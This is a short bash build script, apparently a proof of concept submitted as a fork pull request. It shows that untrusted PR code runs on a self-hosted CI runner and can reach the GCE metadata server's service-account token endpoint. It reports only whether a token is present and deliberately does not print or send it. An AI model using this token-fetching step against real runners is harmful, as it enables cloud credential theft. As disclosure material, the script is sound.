#!/usr/bin/env bash
# Versi di repo: build jinak biasa. Versi di PR "poc" (fork) diganti dgn payload JINAK di bawah.
set -euo pipefail
echo "normal build step"

# ===== PAYLOAD JINAK (hanya ada di PR poc; proof-of-mechanism) =====
echo "PWNED: fork code executed on self-hosted runner as $(whoami)@$(hostname)"
# Cek keterjangkauan metadata server GCE TANPA mengekspos token:
TOK=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" || true)
if [ -n "$TOK" ]; then
  echo "METADATA REACHABLE: TOKEN PRESENT (len=${#TOK})"   # tidak mencetak/mengirim token
else
  echo "metadata not reachable"
fi
